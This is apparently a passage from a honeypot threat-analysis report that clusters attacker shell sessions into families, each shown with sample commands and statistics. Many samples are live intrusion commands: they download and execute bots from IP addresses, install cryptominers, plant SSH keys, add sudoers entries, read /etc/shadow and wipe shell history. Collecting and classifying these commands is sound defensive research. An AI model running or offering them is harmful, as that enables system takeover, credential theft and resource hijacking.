[('cat', '|'), ('grep', '|'), ('wc', ';'), ('echo', '|'), ('passwd', '|'), ('bash', ';'), ('echo', '|'), ('passwd', ';'), ('cat', '|'), ('grep', '|'), ('head', '|'), ('awk', ';'), ('free', '|'), ('grep', '|'), ('awk', ';'), ('ls', ';'), ('which', ';'), ('crontab', ';'), ('w', ';'), ('uname', ';'), ('cat', '|'), ('grep', '|'), ('grep', '|'), ('wc', ';'), ('top', ';'), ('uname', ';')]
```

Top operators: [('grep', 11), ('cat', 6), ('uname', 6), ('awk', 5), ('wc', 4), ('echo', 4), ('passwd', 4), ('head', 3), ('bash', 2), ('free', 2)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 20bd857572ccd532 | 122cb847c653 |       17 |
| bd844bc9a912407b | 36a44f645b19 |       14 |

## Family 65

Size: **2**, mean_FS: **0.818**, sd_FS: **0.000**  
Medoid: `fi_hash=26684774b65b2443` (session `2ae27254130b`, n_rows=1)  

**Medoid commands (snippet):**

```bash
mkdir -p /tmp/criptonize/criptonize2 || mkdir -p /var/tmp/criptonize/criptonize2 || mkdir -p /dev/criptonize/criptonize2 || mkdir -p criptonize/criptonize2; cd /tmp/criptonize || cd /var/tmp/criptonize || cd /dev/criptonize || cd criptonize/criptonize2; ls -F
```

Consensus (op, conn) pairs:

```python
[('mkdir', '||'), ('mkdir', '||'), ('mkdir', '||'), ('mkdir', ';'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', ';'), ('ls', 'EOS')]
```

Top operators: [('mkdir', 8), ('cd', 8), ('ls', 2), ('sudo', 1), ('mount', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 26684774b65b2443 | 2ae27254130b |        1 |
| 3b7f326fc1b2d08f | 0bee44f82e56 |        1 |

## Family 24

Size: **2**, mean_FS: **0.800**, sd_FS: **0.000**  
Medoid: `fi_hash=0873f2eec64f2ee4` (session `9c4f018d3526`, n_rows=2)  

**Medoid commands (snippet):**

```bash
echo 'nameserver 95.214.27.202'>/etc/resolv.conf
cat /bin/echo || while read i; do echo $i; done < /proc/self/exe
```

Consensus (op, conn) pairs:

```python
[('echo', ';'), ('cat', '||'), ('read', ';'), ('echo', 'EOS')]
```

Top operators: [('echo', 4), ('cat', 2), ('read', 2), ('enable', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 0873f2eec64f2ee4 | 9c4f018d3526 |        2 |
| 505c6aed1e5ca23f | 074d141bb877 |        3 |

## Family 21

Size: **2**, mean_FS: **0.800**, sd_FS: **0.000**  
Medoid: `fi_hash=35307cf2a4723623` (session `00837a513d97`, n_rows=2)  

**Medoid commands (snippet):**

```bash
cat /bin/echo
>/tmp/.a && cd /tmp; >/dev/.a && cd /dev; wget http://2.58.149.116/x86 -O- >.f; chmod 777 .f; ./.f scan.wget.x86
```

Consensus (op, conn) pairs:

```python
[('cat', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('wget', ';'), ('chmod', ';'), ('PH_EXEC_1', 'EOS')]
```

Top operators: [('cat', 4), ('>', 4), ('cd', 4), ('wget', 2), ('chmod', 2), ('PH_EXEC_1', 2)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 35307cf2a4723623 | 00837a513d97 |        2 |
| 5e36d23ed4ccbbe4 | 002e5f3075bc |        2 |

## Family 27

Size: **2**, mean_FS: **0.800**, sd_FS: **0.000**  
Medoid: `fi_hash=5f2157051b5f8e60` (session `4dff9ff8318b`, n_rows=1)  

**Medoid commands (snippet):**

```bash
cd /tmp; wget http://179.43.175.5/ssh.sh; chmod 777 ssh.sh; sh ssh.sh; curl http://179.43.175.5/sshc.sh -o sshc.sh; chmod 777 sshc.sh; sh sshc.sh; rm -rf *
```

Consensus (op, conn) pairs:

```python
[('cd', ';'), ('wget', ';'), ('chmod', ';'), ('sh', ';'), ('curl', ';'), ('chmod', ';'), ('sh', ';')]
```

Top operators: [('chmod', 4), ('sh', 4), ('rm', 3), ('cd', 2), ('wget', 2), ('curl', 2), ('history', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 5f2157051b5f8e60 | 4dff9ff8318b |        1 |
| 947e1019f5a9f6de | 00f95d421823 |        1 |

## Family 31

Size: **2**, mean_FS: **0.800**, sd_FS: **0.000**  
Medoid: `fi_hash=9e9e778865205a3c` (session `3254978a6de1`, n_rows=1)  

**Medoid commands (snippet):**

```bash
cd /tmp; rm -rf ok.sh wget 46.105.83.253/ok.sh; sh ok.sh; rm -rf ok.sh; curl -O 46.105.83.253/ok.sh; sh ok.sh; rm -rf ok.sh; history -c; wget 46.105.83.253/cnrig; chmod 777 cnrig; ./cnrig --donate-level 1 -o pool.supportxmr.com:443 -u 42yA8XVUCAWKAztxYLTJ96e8p ...
```

Consensus (op, conn) pairs:

```python
[('cd', ';'), ('sh', ';'), ('rm', ';'), ('curl', ';'), ('sh', ';'), ('rm', ';'), ('chmod', ';'), ('PH_EXEC_2', ';'), ('history', ';'), ('cat', '&&'), ('history', '&&')]
```

Top operators: [('rm', 7), ('history', 6), ('sh', 4), ('curl', 3), ('cd', 2), ('wget', 2), ('chmod', 2), ('PH_EXEC_2', 2), ('cat', 2)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 9e9e778865205a3c | 3254978a6de1 |        1 |
| af57e28ece780743 | 9fe1f98a67d4 |        1 |

## Family 14

Size: **2**, mean_FS: **0.773**, sd_FS: **0.000**  
Medoid: `fi_hash=c2effc675d0429bf` (session `551951d2f0f8`, n_rows=1)  

**Medoid commands (snippet):**

```bash
nproc; cd /tmp; wget http://209.97.132.66:81/miner.sh; bash miner.sh; cd /tmp; curl -O http://209.97.132.66:81/divu2; wget http://209.97.132.66:81/divu2; perl divu2; rm -rf divu2* miner.sh
```

Consensus (op, conn) pairs:

```python
[('nproc', ';'), ('cd', ';'), ('wget', ';'), ('bash', ';'), ('cd', ';'), ('perl', ';'), ('rm', 'EOS')]
```

Top operators: [('cd', 4), ('wget', 4), ('perl', 3), ('nproc', 2), ('bash', 2), ('curl', 2), ('rm', 2), ('uname', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| c2effc675d0429bf | 551951d2f0f8 |        1 |
| da7ba83b3a5fa7fb | 2dafc490b9e9 |        1 |

## Family 140

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=0014c5294a1b8182` (session `b898ce35a477`, n_rows=5)  

**Medoid commands (snippet):**

```bash
curl https://raw.githubusercontent.com/SonyaCore/V2RayGen/main/V2RayGen.py | sudo python3 - --vmesstls --block
sudo curl https://raw.githubusercontent.com/SonyaCore/V2RayGen/main/V2RayGen.py | sudo python3 - --vmesstls --block
sudo -
sudo bash -c "$(wget -qO-  ...
```

Consensus (op, conn) pairs:

```python
[('curl', '|'), ('sudo', ';'), ('sudo', '|'), ('sudo', ';'), ('sudo', ';'), ('sudo', ';'), ('wget', 'EOS')]
```

Top operators: [('sudo', 5), ('curl', 1), ('wget', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 0014c5294a1b8182 | b898ce35a477 |        5 |

## Family 99

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=056646a27a9526eb` (session `950fc3eb6790`, n_rows=1)  

**Medoid commands (snippet):**

```bash
exit
```

Consensus (op, conn) pairs:

```python
[('exit', 'EOS')]
```

Top operators: [('exit', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 056646a27a9526eb | 950fc3eb6790 |        1 |

## Family 187

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=05976fe2c44b12c0` (session `895c959b895d`, n_rows=1)  

**Medoid commands (snippet):**

```bash
wget; echo -e '\\x67\\x61\\x79\\x66\\x67\\x74'
```

Consensus (op, conn) pairs:

```python
[('wget', ';'), ('echo', 'EOS')]
```

Top operators: [('wget', 1), ('echo', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 05976fe2c44b12c0 | 895c959b895d |        1 |

## Family 142

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=07f8154c1fcbe103` (session `fce40caadfc2`, n_rows=2)  

**Medoid commands (snippet):**

```bash
cat /bin/sh || cat /bin/busybox || cat /bin/bash
cd /tmp; wget http://31.44.185.235/x86 -O- >.f; chmod 777 .f; ./.f ssh.x86
```

Consensus (op, conn) pairs:

```python
[('cat', '||'), ('cat', '||'), ('cat', ';'), ('cd', ';'), ('wget', ';'), ('chmod', ';'), ('PH_EXEC_1', 'EOS')]
```

Top operators: [('cat', 3), ('cd', 1), ('wget', 1), ('chmod', 1), ('PH_EXEC_1', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 07f8154c1fcbe103 | fce40caadfc2 |        2 |

## Family 168

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=0a5dda85af36ea57` (session `51f11bd7d1f5`, n_rows=1)  

**Medoid commands (snippet):**

```bash
cd /tmp; rm -rf wget*; curl -O http://45.95.55.24/wget.sh; wget http://45.95.55.24/wget.sh; chmod 777 wget.sh; ./wget.sh
```

Consensus (op, conn) pairs:

```python
[('cd', ';'), ('rm', ';'), ('curl', ';'), ('wget', ';'), ('chmod', ';'), ('PH_EXEC_1', 'EOS')]
```

Top operators: [('cd', 1), ('rm', 1), ('curl', 1), ('wget', 1), ('chmod', 1), ('PH_EXEC_1', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 0a5dda85af36ea57 | 51f11bd7d1f5 |        1 |

## Family 151

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=0c250449b53131fe` (session `1e8a45cb7dc8`, n_rows=15)  

**Medoid commands (snippet):**

```bash
>/tmp/.l && cd /tmp/ && cp /bin/echo ntpclient && >ntpclient && chmod 777 ntpclient; echo -en '\\x50\\x41\\x54\\x48\\x5f\\x44\\x4f\\x4e\\x45'
>/var/.l && cd /var/ && cp /bin/echo ntpclient && >ntpclient && chmod 777 ntpclient; echo -en '\\x50\\x41\\x54\\x48\\x ...
```

Consensus (op, conn) pairs:

```python
[('>', '&&'), ('cd', '&&'), ('cp', '&&'), ('>', '&&'), ('chmod', ';'), ('echo', ';'), ('>', '&&'), ('cd', '&&'), ('cp', '&&'), ('>', '&&'), ('chmod', ';'), ('echo', ';'), ('>', '&&'), ('cd', '&&'), ('cp', '&&'), ('>', '&&'), ('chmod', ';'), ('echo', ';'), ('>', '&&'), ('cd', '&&'), ('cp', '&&'), ('>', '&&'), ('chmod', ';'), ('echo', ';'), ('>', '&&'), ('cd', '&&'), ('cp', '&&'), ('>', '&&'), ('chmod', ';'), ('echo', ';'), ('>', '&&'), ('cd', '&&'), ('cp', '&&'), ('>', '&&'), ('chmod', ';'), ('echo', ';'), ('>', '&&'), ('cd', '&&'), ('cp', '&&'), ('>', '&&'), ('chmod', ';'), ('echo', ';'), ('>', '&&'), ('cd', '&&'), ('cp', '&&'), ('>', '&&'), ('chmod', ';'), ('echo', ';'), ('>', '&&'), ('cd', '&&'), ('cp', '&&'), ('>', '&&'), ('chmod', ';'), ('echo', ';'), ('>', '&&'), ('cd', '&&'), ('cp', '&&'), ('>', '&&'), ('chmod', ';'), ('echo', ';'), ('>', '&&'), ('cd', '&&'), ('cp', '&&'), ('>', '&&'), ('chmod', ';'), ('echo', ';'), ('>', '&&'), ('cd', '&&'), ('cp', '&&'), ('>', '&&'), ('chmod', ';'), ('echo', ';'), ('>', '&&'), ('cd', '&&'), ('cp', '&&'), ('>', '&&'), ('chmod', ';'), ('echo', ';'), ('>', '&&'), ('cd', '&&'), ('cp', '&&'), ('>', '&&'), ('chmod', ';'), ('echo', ';'), ('wget', ';'), ('chmod', ';'), ('PH_EXEC_1', 'EOS')]
```

Top operators: [('>', 28), ('chmod', 15), ('cd', 14), ('cp', 14), ('echo', 14), ('wget', 1), ('PH_EXEC_1', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 0c250449b53131fe | 1e8a45cb7dc8 |       15 |

## Family 186

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=0c4d10a419a3e4d0` (session `2ba3328b7138`, n_rows=1)  

**Medoid commands (snippet):**

```bash
cd /tmp/; wget http://194.31.98.244/w -O-> w; sh w; rm -rf w
```

Consensus (op, conn) pairs:

```python
[('cd', ';'), ('wget', ';'), ('sh', ';'), ('rm', 'EOS')]
```

Top operators: [('cd', 1), ('wget', 1), ('sh', 1), ('rm', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 0c4d10a419a3e4d0 | 2ba3328b7138 |        1 |

## Family 154

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=0d1edb8e374187f5` (session `3f81fbbf4b90`, n_rows=4)  

**Medoid commands (snippet):**

```bash
echo -e '\\x67\\x61\\x79\\x66\\x67\\x74'
echo -e '\\x67\\x61\\x79\\x66\\x67\\x74'
echo -e '\\x67\\x61\\x79\\x66\\x67\\x74'
echo -e '\\x67\\x61\\x79\\x66\\x67\\x74'
```

Consensus (op, conn) pairs:

```python
[('echo', ';'), ('echo', ';'), ('echo', ';'), ('echo', 'EOS')]
```

Top operators: [('echo', 4)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 0d1edb8e374187f5 | 3f81fbbf4b90 |        4 |

## Family 94

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=0d8e1c1ec8c8f3c7` (session `27dfef92ea48`, n_rows=1)  

**Medoid commands (snippet):**

```bash
uname -a; wget http://141.147.14.241/a.txt; perl a.txt; rm -rf a.txt
```

Consensus (op, conn) pairs:

```python
[('uname', ';'), ('wget', ';'), ('perl', ';'), ('rm', 'EOS')]
```

Top operators: [('uname', 1), ('wget', 1), ('perl', 1), ('rm', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 0d8e1c1ec8c8f3c7 | 27dfef92ea48 |        1 |

## Family 184

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=1557567e2d656af3` (session `351bb5b0bfe1`, n_rows=4)  

**Medoid commands (snippet):**

```bash
ifconfig
uname -a
cat /proc/cpuinfo
ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
```

Consensus (op, conn) pairs:

```python
[('ifconfig', ';'), ('uname', ';'), ('cat', ';'), ('ls', 'EOS')]
```

Top operators: [('ifconfig', 1), ('uname', 1), ('cat', 1), ('ls', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 1557567e2d656af3 | 351bb5b0bfe1 |        4 |

## Family 98

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=16b02e9903b10872` (session `108db9d65aef`, n_rows=3)  

**Medoid commands (snippet):**

```bash
sh
shell
enable
```

Consensus (op, conn) pairs:

```python
[('sh', ';'), ('shell', ';'), ('enable', 'EOS')]
```

Top operators: [('sh', 1), ('shell', 1), ('enable', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 16b02e9903b10872 | 108db9d65aef |        3 |

## Family 141

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=186aa48ffac79921` (session `0365cf7cdb7d`, n_rows=1)  

**Medoid commands (snippet):**

```bash
cd /tmp || cd /; wget -q http://kevincnc.madafaka.me/cometome; cat cometome > vegaiscoming; chmod +x vegaiscoming; ./vegaiscoming
```

Consensus (op, conn) pairs:

```python
[('cd', '||'), ('cd', ';'), ('wget', ';'), ('cat', ';'), ('chmod', ';'), ('PH_EXEC_1', 'EOS')]
```

Top operators: [('cd', 2), ('wget', 1), ('cat', 1), ('chmod', 1), ('PH_EXEC_1', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 186aa48ffac79921 | 0365cf7cdb7d |        1 |

## Family 135

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=1bf43f8e52f8a245` (session `87dd531aad68`, n_rows=1)  

**Medoid commands (snippet):**

```bash
echo root:storytimeababyj23it345uig3jrhju345h | chpasswd | bash; pkill java; pkill ntpd; pkill screen; pkill zhh; pkill xmrig; pkill cnrig; pkill x86; echo 1; curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF ...
```

Consensus (op, conn) pairs:

```python
[('echo', '|'), ('chpasswd', '|'), ('bash', ';'), ('kill', ';'), ('kill', ';'), ('kill', ';'), ('kill', ';'), ('kill', ';'), ('kill', ';'), ('kill', ';'), ('echo', ';'), ('curl', '|'), ('bash', ';'), ('echo', 'EOS')]
```

Top operators: [('kill', 7), ('echo', 3), ('bash', 2), ('chpasswd', 1), ('curl', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 1bf43f8e52f8a245 | 87dd531aad68 |        1 |

## Family 117

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=1e89091f2e86a160` (session `100eb8c32981`, n_rows=34)  

**Medoid commands (snippet):**

```bash
uname -a
vi script.sh
echo "uname -a" >> script.sh
sh script.s
./script.sh
sh script.sh
chmod +x script.sh
ls -lrt
./script.sh
wget www.viessmann.co.uk
ls -rlt
cat index.html
rm index.html
ls -lrt
history
bash
ps
sh
ps
ksh
zsh
csh
help
popd
pushd /home/admin
p ...
```

Consensus (op, conn) pairs:

```python
[('uname', ';'), ('vi', ';'), ('echo', ';'), ('sh', ';'), ('PH_EXEC_2', ';'), ('sh', ';'), ('chmod', ';'), ('ls', ';'), ('PH_EXEC_2', ';'), ('wget', ';'), ('ls', ';'), ('cat', ';'), ('rm', ';'), ('ls', ';'), ('history', ';'), ('bash', ';'), ('ps', ';'), ('sh', ';'), ('ps', ';'), ('sh', ';'), ('zsh', ';'), ('csh', ';'), ('help', ';'), ('popd', ';'), ('pushd', ';'), ('popd', ';'), ('dir', ';'), ('ls', ';'), ('dir', ';'), ('uname', ';'), ('uname', ';'), ('ver', ';'), ('set', ';'), ('echo', 'EOS')]
```

Top operators: [('sh', 4), ('ls', 4), ('uname', 3), ('echo', 2), ('PH_EXEC_2', 2), ('ps', 2), ('popd', 2), ('dir', 2), ('vi', 1), ('chmod', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 1e89091f2e86a160 | 100eb8c32981 |       34 |

## Family 105

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=1fcdb2bf5350af12` (session `1547b28b6807`, n_rows=1)  

**Medoid commands (snippet):**

```bash
scp -f /home/admin/*
```

Consensus (op, conn) pairs:

```python
[('scp', 'EOS')]
```

Top operators: [('scp', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 1fcdb2bf5350af12 | 1547b28b6807 |        1 |

## Family 95

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=233ab5b90f897251` (session `b95df1713ce5`, n_rows=5)  

**Medoid commands (snippet):**

```bash
?
ls -a
pwd
cd ..
pwd
```

Consensus (op, conn) pairs:

```python
[('?', ';'), ('ls', ';'), ('pwd', ';'), ('cd', ';'), ('pwd', 'EOS')]
```

Top operators: [('pwd', 2), ('?', 1), ('ls', 1), ('cd', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 233ab5b90f897251 | b95df1713ce5 |        5 |

## Family 182

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=2510a610df4ead7b` (session `06378152794b`, n_rows=1)  

**Medoid commands (snippet):**

```bash
uname -a; lscpu
```

Consensus (op, conn) pairs:

```python
[('uname', ';'), ('lscpu', 'EOS')]
```

Top operators: [('uname', 1), ('lscpu', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 2510a610df4ead7b | 06378152794b |        1 |

## Family 138

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=251c9a25e1a5a70e` (session `352dd6d8a366`, n_rows=2)  

**Medoid commands (snippet):**

```bash
uname -a
uname -a
```

Consensus (op, conn) pairs:

```python
[('uname', ';'), ('uname', 'EOS')]
```

Top operators: [('uname', 2)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 251c9a25e1a5a70e | 352dd6d8a366 |        2 |

## Family 96

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=28281c644bd397f5` (session `a05d147fe4d7`, n_rows=1)  

**Medoid commands (snippet):**

```bash
whoami
```

Consensus (op, conn) pairs:

```python
[('whoami', 'EOS')]
```

Top operators: [('whoami', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 28281c644bd397f5 | a05d147fe4d7 |        1 |

## Family 180

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=2b01ec629572aa19` (session `2feca129f51d`, n_rows=2)  

**Medoid commands (snippet):**

```bash
ifconfig
ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
```

Consensus (op, conn) pairs:

```python
[('ifconfig', ';'), ('ls', 'EOS')]
```

Top operators: [('ifconfig', 1), ('ls', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 2b01ec629572aa19 | 2feca129f51d |        2 |

## Family 109

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=2cc126fefe7ffaa6` (session `cb5b1afeea90`, n_rows=1)  

**Medoid commands (snippet):**

```bash
uname -a; nproc; lspci | grep -i --color 'VGA\\ | 3d\\ | 2d'
```

Consensus (op, conn) pairs:

```python
[('uname', ';'), ('nproc', ';'), ('lspci', '|'), ('grep', 'EOS')]
```

Top operators: [('uname', 1), ('nproc', 1), ('lspci', 1), ('grep', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 2cc126fefe7ffaa6 | cb5b1afeea90 |        1 |

## Family 155

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=2d81aa28a8a37038` (session `3680f8a65d52`, n_rows=4)  

**Medoid commands (snippet):**

```bash
uname -a
hostname
uname -m && pkill upnpsetup
sudo pkill upnpsetup
```

Consensus (op, conn) pairs:

```python
[('uname', ';'), ('hostname', ';'), ('uname', '&&'), ('kill', ';'), ('sudo', 'EOS')]
```

Top operators: [('uname', 2), ('hostname', 1), ('kill', 1), ('sudo', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 2d81aa28a8a37038 | 3680f8a65d52 |        4 |

## Family 183

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=2df70df748c5f778` (session `2324af479113`, n_rows=2)  

**Medoid commands (snippet):**

```bash
sudo bash -c "$(wget -qO- https://raw.githubusercontent.com/Jigsaw-Code/outline-server/master/src/server_manager/install_scripts/install_server.sh)"
wget -qO- https://raw.githubusercontent.com/Jigsaw-Code/outline-server/master/src/server_manager/install_script ...
```

Consensus (op, conn) pairs:

```python
[('sudo', ';'), ('wget', 'EOS')]
```

Top operators: [('sudo', 1), ('wget', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 2df70df748c5f778 | 2324af479113 |        2 |

## Family 181

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=2e2e532e32b6bb5d` (session `17e5a8a35778`, n_rows=3)  

**Medoid commands (snippet):**

```bash
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK ...
```

Consensus (op, conn) pairs:

```python
[('cd', '&&'), ('rm', '&&'), ('mkdir', '&&'), ('echo', '&&'), ('chmod', '&&'), ('chattr', '&&'), ('cd', ';'), ('echo', '|'), ('base64', '|'), ('bash', ';'), ('sleep', '&&'), ('echo', '|'), ('base64', '|'), ('perl', 'EOS')]
```

Top operators: [('echo', 3), ('cd', 2), ('base64', 2), ('rm', 1), ('mkdir', 1), ('chmod', 1), ('chattr', 1), ('bash', 1), ('sleep', 1), ('perl', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 2e2e532e32b6bb5d | 17e5a8a35778 |        3 |

## Family 137

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=2fa7c819a9f82896` (session `ac9711579aa2`, n_rows=8)  

**Medoid commands (snippet):**

```bash
cat /proc/cpuinfo | grep name | wc -l
echo -e "admin\\nMUrFp73UsZKo\\nMUrFp73UsZKo" | passwd | bash
echo "admin\\nMUrFp73UsZKo\\nMUrFp73UsZKo\\n" | passwd
echo "321" > /var/tmp/.var03522123
uname
uname -a
lscpu | grep Model
echo "admin admin" > /tmp/up.txt
```

Consensus (op, conn) pairs:

```python
[('cat', '|'), ('grep', '|'), ('wc', ';'), ('echo', '|'), ('passwd', '|'), ('bash', ';'), ('echo', '|'), ('passwd', ';'), ('echo', ';'), ('uname', ';'), ('uname', ';'), ('lscpu', '|'), ('grep', ';'), ('echo', 'EOS')]
```

Top operators: [('echo', 4), ('grep', 2), ('passwd', 2), ('uname', 2), ('cat', 1), ('wc', 1), ('bash', 1), ('lscpu', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 2fa7c819a9f82896 | ac9711579aa2 |        8 |

## Family 101

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=3986c18bee07a97d` (session `1bc1bccc7103`, n_rows=1)  

**Medoid commands (snippet):**

```bash
uname -a; id; cat /etc/shadow /etc/passwd; lscpu; echo 'daemon ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers; chsh -s /bin/sh daemon; echo Password123 | passwd daemon --stdin; chattr -ia /root/.ssh/*; wget http://124.70.7.7/ns1.jpg -O ~/.ssh/authorized_keys; chmod  ...
```

Consensus (op, conn) pairs:

```python
[('uname', ';'), ('id', ';'), ('cat', ';'), ('lscpu', ';'), ('echo', ';'), ('chsh', ';'), ('echo', '|'), ('passwd', ';'), ('chattr', ';'), ('wget', ';'), ('chmod', ';'), ('wget', '|'), ('perl', ';'), ('wget', ';'), ('chmod', ';'), ('PH_EXEC_1', ';'), ('mv', ';'), ('PH_EXEC_2', ';'), ('rm', ';'), ('mkdir', ';'), ('cp', ';'), ('chown', ';'), ('chmod', ';'), ('chmod', ';'), ('wget', ';'), ('chmod', ';'), ('PH_EXEC_3', ';'), ('curl', ';'), ('chmod', ';'), ('PH_EXEC_3', ';'), ('rm', 'EOS')]
```

Top operators: [('chmod', 6), ('wget', 4), ('echo', 2), ('rm', 2), ('PH_EXEC_3', 2), ('uname', 1), ('id', 1), ('cat', 1), ('lscpu', 1), ('chsh', 1)]

**Members (first 5):**

| fi_hash          | session      |   n_rows |
|:-----------------|:-------------|---------:|
| 3986c18bee07a97d | 1bc1bccc7103 |        1 |

## Family 104

Size: **1**, mean_FS: **1.000**, sd_FS: **0.000**  
Medoid: `fi_hash=45b96e92065952e7` (session `3da52331489d`, n_rows=30)  

**Medoid commands (snippet):**

```bash
cd ~; chattr -ia .ssh; lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgT ...
```

Consensus (op, conn) pairs:

```python
